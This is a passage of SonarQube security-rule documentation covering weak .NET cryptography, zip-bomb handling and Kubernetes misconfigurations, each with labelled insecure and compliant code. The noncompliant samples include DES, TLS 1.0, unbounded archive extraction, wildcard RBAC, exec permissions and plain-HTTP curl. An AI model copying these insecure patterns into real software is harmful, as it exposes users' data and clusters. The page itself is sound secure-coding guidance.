    var aes = new AesCryptoServiceProvider();

    var encryptor = aes.CreateEncryptor(key, aes.IV);

    var cryptoStream = new CryptoStream(target, encryptor, CryptoStreamMode.Write);
    var swEncrypt    = new StreamWriter(cryptoStream);

    swEncrypt.Write(dataToEncrypt);
}
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure high security, initialization vectors must meet two important criteria:</p>
<ul>
  <li> IVs must be unique for each encryption operation. </li>
  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>
</ul>
<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/329">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/780">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5547">
              csharpsquid:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
using System.Security.Cryptography;

public void encrypt()
{
    var simpleDES = new DESCryptoServiceProvider(); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
using System.Security.Cryptography;

public void encrypt()
{
    using (Aes aes = Aes.Create())
    {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4423">
              csharpsquid:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>These samples use TLSv1.0 as the default TLS algorithm, which is cryptographically weak.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Net;

public void encrypt()
{
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls; // Noncompliant
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
using System.Net.Http;
using System.Security.Authentication;

public void encrypt()
{
    new HttpClientHandler
    {
        SslProtocols = SslProtocols.Tls // Noncompliant
    };
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Using System.Net;

public void encrypt()
{
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
using System.Net.Http;
using System.Security.Authentication;

public void encrypt()
{
    new HttpClientHandler
    {
        SslProtocols = SslProtocols.Tls12
    };
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5042">
              csharpsquid:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
using var zipToOpen = new FileStream(@"ZipBomb.zip", FileMode.Open);
using var archive = new ZipArchive(zipToOpen, ZipArchiveMode.Read);
foreach (ZipArchiveEntry entry in archive.Entries)
{
  entry.ExtractToFile("./output_onlyfortesting.txt", true); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int THRESHOLD_ENTRIES = 10000;
int THRESHOLD_SIZE = 1000000000; // 1 GB
double THRESHOLD_RATIO = 10;
int totalSizeArchive = 0;
int totalEntryArchive = 0;

using var zipToOpen = new FileStream(@"ZipBomb.zip", FileMode.Open);
using var archive = new ZipArchive(zipToOpen, ZipArchiveMode.Read);
foreach (ZipArchiveEntry entry in archive.Entries)
{
  totalEntryArchive ++;

  using (Stream st = entry.Open())
  {
    byte[] buffer = new byte[1024];
    int totalSizeEntry = 0;
    int numBytesRead = 0;

    do
    {
      numBytesRead = st.Read(buffer, 0, 1024);
      totalSizeEntry += numBytesRead;
      totalSizeArchive += numBytesRead;
      double compressionRatio = totalSizeEntry / entry.CompressedLength;

      if(compressionRatio &gt; THRESHOLD_RATIO) {
        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
        break;
      }
    }
    while (numBytesRead &gt; 0);
  }

  if(totalSizeArchive &gt; THRESHOLD_SIZE) {
      // the uncompressed data size is too much for the application resource capacity
      break;
  }

  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {
      // too much entries in this archive, can lead to inodes exhaustion of the system
      break;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6865">
              kubernetes:S6865
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Service account tokens are Kubernetes secrets created automatically to authenticate applications running inside pods to the API server. If a pod is
compromised, an attacker could use this token to gain access to other resources in the cluster.</p>
<p>For example, they could create new pods, modify existing ones, or even delete critical system pods, depending on the permissions associated with
the service account.</p>
<p>Therefore, it’s recommended to disable the automounting of service account tokens when it’s not necessary for the application running in the
pod.</p>
<h3>What is the potential impact?</h3>
<h4>Unauthorized Access</h4>
<p>If a pod with a mounted service account gets compromised, an attacker could potentially use the token to interact with the Kubernetes API, possibly
leading to unauthorized access to other resources in the cluster.</p>
<h4>Privilege Escalation</h4>
<p>Service account tokens are often bound with roles that have extensive permissions. If these tokens are exposed, it could lead to privilege
escalation where an attacker gains higher-level permissions than intended.</p>
<h4>Data Breach</h4>
<p>Service account tokens can be used to access sensitive data stored in the Kubernetes cluster. If these tokens are compromised, it could lead to a
data breach.</p>
<h4>Denial of Service</h4>
<p>An attacker with access to a service account token could potentially overload the Kubernetes API server by sending a large number of requests,
leading to a Denial of Service (DoS) attack.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
apiVersion: v1
kind: Pod
metadata:
  name: example-pod
spec: # Noncompliant
  containers:
  - name: example-pod
    image: nginx:1.25.3
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
apiVersion: v1
kind: Pod
metadata:
  name: example-pod
spec:
  containers:
  - name: example-pod
    image: nginx:1.25.3
  automountServiceAccountToken: false
</pre>
<h3>How does this work?</h3>
<p>The automounting of service account tokens can be disabled by setting <code>automountServiceAccountToken: false</code> in the pod’s specification.
Additionally, it can be disabled in the configuration of an accompanied service account.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Kubernetes Documentation - <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/">Configure Service
  Accounts for Pods</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/306">CWE-306 - Missing Authentication for Critical Function</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6867">
              kubernetes:S6867
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Using wildcards when defining Role-Based Access Control (RBAC) permissions in Kubernetes can lead to significant security issues. This is because
it grants overly broad permissions, potentially allowing access to sensitive resources.</p>
<p>RBAC is designed to limit the access rights of users within the system by assigning roles to them. These roles define what actions a user can
perform and on which resources. When a wildcard is used, it means that the role has access to all resources/verbs, bypassing the principle of least
privilege. This principle states that users should have only the minimal permissions they need to perform their job function.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker gains access to a role with wildcard permissions, they could potentially read, modify, or delete any resource in the Kubernetes
cluster, leading to data breaches, service disruptions, or other malicious activities.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: example-role
rules:
  - apiGroups: [""]
    resources: ["*"] # Noncompliant
    verbs: ["get", "list"]
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: example-role
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
</pre>
<h3>How does this work?</h3>
<p>When defining RBAC permissions, it is important to follow the principle of least privilege. By explicitly specifying the verbs and resources a user
should have access to instead of using wildcards, it can be ensured that users have only the permissions they need to perform their job function.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Kubernetes Documentation - <a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">Using RBAC Authorization</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6868">
              kubernetes:S6868
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Allowing command execution (exec) for roles in a Kubernetes cluster can pose a significant security risk. This is because it provides the user with
the ability to execute arbitrary commands within a container, potentially leading to unauthorized access or data breaches.</p>
<p>In a production Kubernetes cluster, exec permissions are typically unnecessary due to the principle of least privilege, which suggests that a user
or process should only have the minimum permissions necessary to perform its function. Additionally, containers in production are often treated as
immutable infrastructure, meaning they should not be changed once deployed. Any changes should be made to the container image, which is then used to
deploy a new container.</p>
<h3>What is the potential impact?</h3>
<h4>Exploiting Vulnerabilities Within the Container</h4>
<p>If a user or service has the ability to execute commands within a container, they could potentially identify and exploit vulnerabilities within the
container’s software. This could include exploiting known vulnerabilities in outdated software versions, or finding and exploiting new
vulnerabilities. This could lead to unauthorized access to the container, allowing the attacker to manipulate its operations or access its data.</p>
<h4>Installing Malicious Software</h4>
<p>Command execution permissions could also be used to install malicious software within a container. This could include malware, spyware, ransomware,
or other types of harmful software. Once installed, this software could cause a wide range of issues, from data corruption or loss, to providing a
backdoor for further attacks. It could also be used to create a botnet, using the compromised container to launch attacks on other systems.</p>
<h4>Extracting Sensitive Data</h4>
<p>If an attacker has the ability to execute commands within a container, they could potentially access and extract sensitive data. This could include
user data, confidential business information, or other types of sensitive data. The extracted data could then be used for a wide range of malicious
purposes, from identity theft to corporate espionage. This could lead to significant financial loss, damage to reputation, and potential legal
consequences.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: example-role
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get"]
  - apiGroups: [""]
    resources: ["pods/exec"] # Noncompliant
    verbs: ["create"]
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: example-role
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get"]
</pre>
<h3>How does this work?</h3>
<p>The <code>exec</code> permissions are set by allowing the <code>create</code> verb for the <code>pods/exec</code> resource. Removing this
permission will prevent users and services from executing arbitrary commands within containers.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Kubernetes Documentation - <a href="https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/">Get a Shell to a
  Running Container</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S5332">
              kubernetes:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against tampering or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
    </ul>  </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: batch/v1
kind: Job
metadata:
  name: curl
spec:
  template:
    spec:
      containers:
      - name: curl
        image: curlimages/curl
        command: ["curl"]
        args: ["http://example.com/"] # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: batch/v1
kind: Job
metadata:
  name: curl
spec:
  template:
    spec:
      containers:
      - name: curl
        image: curlimages/curl
        command: ["curl"]
        args: ["https://example.com/"]
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/200">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/319">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6864">
              kubernetes:S6864
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A memory limit is a configuration that sets the maximum amount of memory that a container can use. It is part of the resource management
functionality of Kubernetes, which allows for the control and allocation of computational resources to containers.</p>
<p>When a memory limit is set for a container, Kubernetes ensures that the container does not exceed the specified limit. If a container tries to use
more memory than its limit, the system will reclaim the excess memory, which could lead to termination of processes within the container.</p>
<p>Without a memory limit, a container can potentially consume all available memory on a node, which can lead to unpredictable behavior of the
container or the node itself. Therefore, defining a memory limit for each container is a best practice in Kubernetes configurations. It helps in
managing resources effectively and ensures that a single container does not monopolize the memory resources of a node.</p>
<h3>What is the potential impact?</h3>
<h4>Denial of Service</h4>
<p>Without a memory limit, a container can consume all available memory on a node. This could lead to a Denial of Service (DoS) condition where other
containers on the same node are starved of memory. These containers may slow down, become unresponsive, or even crash, affecting the overall
functionality and availability of applications running on them.</p>
<h4>Inefficient Resource Allocation</h4>
<p>When containers lack specified resource requests, the Kubernetes scheduler may not make optimal decisions about pod placement and resource
contention management. This could result in the scheduler placing a resource-intensive pod on a node with insufficient resources, leading to
performance issues or even node failure.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>To avoid potential issues specify a memory limit for each container.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web # Noncompliant
      image: nginx
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      resources:
        limits:
          memory: 100Mi
</pre>
<h3>How does this work?</h3>
<p>A limit can be set through the property <code>resources.limits.memory</code> of a container. Alternatively, a default limit for a namespace can be
set with <code>LimitRange</code>.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Kubernetes Documentation - <a href="https://kubernetes.io/docs/tasks/administer-cluster/manage-resources/memory-default-namespace/">Configure
  Default Memory Requests and Limits for a Namespace</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6869">
              kubernetes:S6869
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A CPU limitation for a container is a specified boundary or restriction that determines the maximum amount of CPU resources that a container can
utilize. It is a part of resource management in a containerized environment, and it is set to ensure that a single container does not monopolize the
CPU resources of the host machine.</p>
<p>CPU limitations are important for maintaining a balanced and efficient system. They help in distributing resources fairly among different
containers, ensuring that no single container can cause a system-wide slowdown by consuming more than its fair share of CPU resources.</p>
<h3>What is the potential impact?</h3>
<h4>Performance degradation</h4>
<p>Without CPU limitations, a single container could monopolize all available CPU resources, leading to a system-wide slowdown. Other containers or
processes on the same host might be deprived of the necessary CPU resources, causing them to function inefficiently.</p>
<h4>System instability</h4>
<p>In extreme cases, a container with no CPU limit could cause the host machine to become unresponsive. This can lead to system downtime and potential
loss of data, disrupting critical operations and impacting system reliability.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web # Noncompliant
      image: nginx
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      resources:
        limits:
          cpu: 0.5
</pre>
<h3>How does this work?</h3>
<p>A limit can be set through the property <code>resources.limits.cpu</code> of a container. Alternatively, a default limit for a namespace can be set
with <code>LimitRange</code>.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Kubernetes Documentation - <a href="https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/">Resource Management for
  Pods and Containers</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6473">
              kubernetes:S6473
            </a>
          </td>
          <td>
            <details>
              <p>Exposing administrative services can lead to unauthorized access to pods or escalation of privileges inside pods.</p>
<p>A port that is commonly used for administration services is open or marked as being open. Administration services like SSH might contain
